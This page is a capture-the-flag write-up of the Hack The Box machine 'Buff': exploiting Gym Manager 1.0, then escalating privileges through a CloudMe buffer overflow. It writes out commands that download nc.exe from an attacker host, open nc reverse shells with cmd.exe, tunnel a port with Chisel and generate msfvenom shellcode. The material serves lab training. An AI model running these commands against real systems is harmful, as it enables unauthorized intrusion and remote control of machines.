<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="/avatar.jpg"/><link rel="stylesheet" href="/_next/static/css/f194b09a73f2e100.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-97a4f47456697fca.js"/><script src="/_next/static/chunks/4bd1b696-4042c1d6d7e15b27.js" async=""></script><script src="/_next/static/chunks/1517-4ce464ed9da3a640.js" async=""></script><script src="/_next/static/chunks/main-app-59d47cb7e6ea11f6.js" async=""></script><script src="/_next/static/chunks/4bd22374-385178446340ab50.js" async=""></script><script src="/_next/static/chunks/8173-a0231b583aa8a812.js" async=""></script><script src="/_next/static/chunks/8541-83b6253cc9a1a19d.js" async=""></script><script src="/_next/static/chunks/5699-d5e6aa1c7bb352a9.js" async=""></script><script src="/_next/static/chunks/app/cyber/writeup/buff/page-ab0162ab3e9d38a1.js" async=""></script><link rel="icon" href="/avatar.jpg"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div class="Wrapper"><div><div class="burger-menu">☰ <!-- -->            </div><div class="sidebarLeft "><div class="avatar"><img src="/avatar.jpg" alt="Avatar"/></div><ul><a href="/"><li>Search</li></a><a href="/cyber/writeup"><li>Writeups</li></a><a href="/cyber/blog"><li>Blog</li></a><a href="/cyber/tags"><li>Tags</li></a><a href=""><li style="color:#555555">Resources</li></a><a href="/cyber/cheat-sheet"><li>Cheat sheets</li></a></ul></div></div><div class="content"><div class="Post"><div><div id="Ignite"><div><h1> <span style="color:#da1953">Ign</span>ite</h1><hr></div><div id="banner"><div><img src="/cyber/writeup/buff/banner.gif" alt=""></div></div><div id="Scanning"><div><hr><h1><span style="color:#da1953">Sca</span>nning</h1><hr></div><div><br><pre>PORT     STATE SERVICE    VERSION<br>7680/tcp open  pando-pub?<br>8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</pre><br></div></div><div id="Exploiting-Gym-Manager"><div><h1><span style="color:#da1953">Exp</span>loiting Gym Manager</h1></div><div><p>The scanning reveals that there is a webserver running on port 8080 so I go to check it hoping to find some interesting information. In the page <i>contact</i>there is a information about the sofware used to build the site which is<i>Gym Manager Software 1.0</i>.</p></div><div><p><img src="/cyber/writeup/buff/394c824c975047da8772b922fcbc9b46.png"></p></div><div><p>Searching a vulnerability or and exploit for, leads me to <a data-from-md title='https://www.exploit-db.com/exploits/48506' href='https://www.exploit-db.com/exploits/48506'>https://www.exploit-db.com/exploits/48506</a>. Then I donwloaded and run it as <code>python 48506.py http://10.10.10.198:8080/</code> and it ended up exploiting the software and giving me a shell. I can't do much with this shell, I cant change directory or do any other stuff so I need to upgrade the shell.</p></div><div><p>In order to do so I decided to download Netcat (nc) to the server and it includes a few steps:</p></div><div><ol><li>Open a web server in my Kali inside my Buff folder that I created to solve the box where I have all the exploits and programs <code>sudo python3 -m http.server 8080</code><br> <img src="/cyber/writeup/buff/56bd6f9c0943430d9b1e04b84c11a092.png"></li><li>From the box I can connect to the Python HTTP server and download files, to do that there are two ways:<ol><li><code>powershell iwr http://10.10.14.197:8080:/nc.exe -outf nc.exe</code></li><li><code>curl http://10.10.14.197:8080/nc.exe -o nc.exe</code><br><img src="/cyber/writeup/buff/a9274a65c7384c498436604953f1e81e.png"><br>In the directory, there are also other users artefacts.</li></ol></li></ol></div><div><p>Once Downloaded I open a listener on my Kali <code>nc -lvp 4444</code> and a client on the box in a way that upon connecting it will execute a command <code>nc.exe 10.10.14.197 4444 -e cmd.exe</code> it will result in having a command of the box on my kali machine.</p></div><div><img src="/cyber/writeup/buff/bf06f1f38deb40e19379033fd6329abe.png"><br></div></div><div id="User-Flag"><div><h1><span style="color:#da1953">Use</span>r flag</h1></div><div><p>Once got the shell I can move to the location of the user flag</p></div><div><img src="/cyber/writeup/buff/ff20b0d447b54c38909325cbea503bca.png"><br></div></div><div id="Priviledge-escalation"><div><h1><span style="color:#da1953">Pri</span>viledge escalation</h1></div><div id="Search-vulnerable-process"><div><h2>Search vulnerable process</h2></div><div><p>To search a vulnerable process its possible to use <code>winpeas.exe</code> but in my case I checked one by one and search for them on google to see which one is vulnerable and I ended up finding <code>CloudMe.exe</code>.</p></div><div><p>Searching for an exploit I ended up finding many and various versions of Cloudme’s version.</p></div></div><div id="Finding-CloudMe-Version"><div><h2>Finding CloudMe Version</h2></div><div><p>While I don't have administrator privilege I can't see the version of the program with <code>tasklist</code> or <code>Get-Proces</code> so I had to look around to see if I find something. In the end, the executable was in the <code>Shaun</code> user’s Download folder, which contains also the version number in the name.<br></div><div><img src="/cyber/writeup/buff/3b6f506a74344ceabfef62b8cdacb5a5.png"><br></div></div><div id="Port-Forwarding"><div><h2>Port Forwarding</h2></div><div><p>I noticed that CloudMe runs on localhost port 8888 so there is no chance that I can remotely exploit it and neither locally because the script is in Python and it is not installed in the box. So I used <b>Chisel</b> to forward the connection. I had to donwload a precompiled version for Windows and Linux from <a data-from-md title='https://github.com/jpillora/chisel/releases/' href='https://github.com/jpillora/chisel/releases/'>https://github.com/jpillora/chisel/releases/</a>. I loaded Chisel in the box in the same way as Netcat. From my Kali machine, I opened a server as shown in <a data-from-md title='https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html' href='https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html'>https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a><br> <code>./chisel server -p 7777 --reverse</code> and a client in the box as <code>chisel client 10.10.14.187:7777 R:8888:127.0.0.1:8888</code><br></div><div><img src="/cyber/writeup/buff/18cc7f4ffbdb4c4a97f31ff0a6bdc1f0.png"><br></div></div><div id="Exploitation"><div><h2>Exploitation</h2></div><div><p>Now my choice of exploit comes down to four possibilities.</p></div><div><p><img src="/cyber/writeup/buff/dce0e1743ade4d6cbee6d9b255793b64.png"></p></div><div><p>And I chose the PoC one.</p></div><div>After opening the exploit it suggested a command line to enumerate a shellcode, so I generated a shellcode that I needed in order to exploit CloudMe and give a reverse shell. <code>msfvenom -a x86 -p windows/exec CMD='C:\xampp\htdocs\gym\upload
c.exe 10.10.14.197 1111 -e cmd.exe' -b '\x00\x0A\x0D' -f python</code> Now I have replaced the new shell code with the old one inside the script. Once exploited the CloudMe, it will invoke <b>nc.exe</b> and try to connect to my Kali machine so before that I have to listen in port 1111. And run the exploit from another shell.<br></div><div><p><img src="/cyber/writeup/buff/9f79a8643caa4742af026633b9a6cad5.png"></p></div><div><p>The root flag in on the administrator desktop.</p></div></div></div></div> </div></div></div><div class="sidebarRight"><div class="sidebarRightChild"><h2>Index</h2><div></div><br/><h2>Tags</h2><div class="tags"><a style="margin-top:10px" href="/cyber/tags?searchTag=Gym+Manager+1.0"><my-tag>Gym Manager 1.0</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=apache+2.4.43"><my-tag>apache 2.4.43</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=box"><my-tag>box</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=chisel"><my-tag>chisel</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=cloudme+1.11.2"><my-tag>cloudme 1.11.2</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=cms"><my-tag>cms</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=ctf"><my-tag>ctf</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=curl"><my-tag>curl</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=download+file"><my-tag>download file</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=easy"><my-tag>easy</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=htb"><my-tag>htb</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=iwr"><my-tag>iwr</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=nsfvenom"><my-tag>nsfvenom</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=port+forwarding"><my-tag>port forwarding</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=powershell"><my-tag>powershell</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=powershell+iwr"><my-tag>powershell iwr</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=privesc"><my-tag>privesc</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=python+webserver"><my-tag>python webserver</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=web"><my-tag>web</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=windows"><my-tag>windows</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=winpeas"><my-tag>winpeas</my-tag></a></div></div></div></div><script src="/_next/static/chunks/webpack-97a4f47456697fca.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[5244,[],\"\"]\n3:I[3866,[],\"\"]\n4:I[3108,[\"7667\",\"static/chunks/4bd22374-385178446340ab50.js\",\"8173\",\"static/chunks/8173-a0231b583aa8a812.js\",\"8541\",\"static/chunks/8541-83b6253cc9a1a19d.js\",\"5699\",\"static/chunks/5699-d5e6aa1c7bb352a9.js\",\"3239\",\"static/chunks/app/cyber/writeup/buff/page-ab0162ab3e9d38a1.js\"],\"default\"]\n5:I[5897,[\"7667\",\"static/chunks/4bd22374-385178446340ab50.js\",\"8173\",\"static/chunks/8173-a0231b583aa8a812.js\",\"8541\",\"static/chunks/8541-83b6253cc9a1a19d.js\",\"5699\",\"static/chunks/5699-d5e6aa1c7bb352a9.js\",\"3239\",\"static/chunks/app/cyber/writeup/buff/page-ab0162ab3e9d38a1.js\"],\"default\"]\n6:I[8845,[\"7667\",\"static/chunks/4bd22374-385178446340ab50.js\",\"8173\",\"static/chunks/8173-a0231b583aa8a812.js\",\"8541\",\"static/chunks/8541-83b6253cc9a1a19d.js\",\"5699\",\"static/chunks/5699-d5e6aa1c7bb352a9.js\",\"3239\",\"static/chunks/app/cyber/writeup/buff/page-ab0162ab3e9d38a1.js\"],\"default\"]\n7:I[6213,[],\"OutletBoundary\"]\n9:I[6213,[],\"MetadataBoundary\"]\nb:I[6213,[],\"ViewportBoundary\"]\nd:I[4835,[],\"\"]\n:HL[\"/_next/static/css/f194b09a73f2e100.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"lRTtoW0zv952YuV5sIyD4\",\"p\":\"\",\"c\":[\"\",\"cyber\",\"writeup\",\"buff\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"cyber\",{\"children\":[\"writeup\",{\"children\":[\"buff\",{\"children\":[\"__PAGE__\",{}]}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[],[\"$\",\"div\",null,{\"children\":[\"$\",\"center\",null,{\"children\":[\"Page not found\",[\"$\",\"br\",null,{}],\"You have followed and old link that does not work anymore\",[\"$\",\"br\",null,{}],\"The site has migrated from React app to NextJS app\"]}]}]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]]}],{\"children\":[\"cyber\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"writeup\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"buff\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\",\"buff\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"className\":\"Wrapper\",\"children\":[[\"$\",\"$L4\",null,{}],[\"$\",\"div\",null,{\"className\":\"content\",\"children\":[\"$\",\"div\",null,{\"className\":\"Post\",\"children\":[\"$\",\"$L5\",null,{\"postname\":\"writeupdb/buff.json\"}]}]}],[\"$\",\"$L6\",null,{\"postname\":\"writeupdb/buff.json\"}]]}],[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/f194b09a73f2e100.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"$L7\",null,{\"children\":\"$L8\"}]]}],{},null,false]},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"sIXbi6k7YYQX_rhJLIj5y\",{\"children\":[[\"$\",\"$L9\",null,{\"children\":\"$La\"}],[\"$\",\"$Lb\",null,{\"children\":\"$Lc\"}],null]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$d\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\na:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"link\",\"1\",{\"rel\":\"icon\",\"href\":\"/avatar.jpg\"}]]\n"])</script><script>self.__next_f.push([1,"8:null\n"])</script></body></html>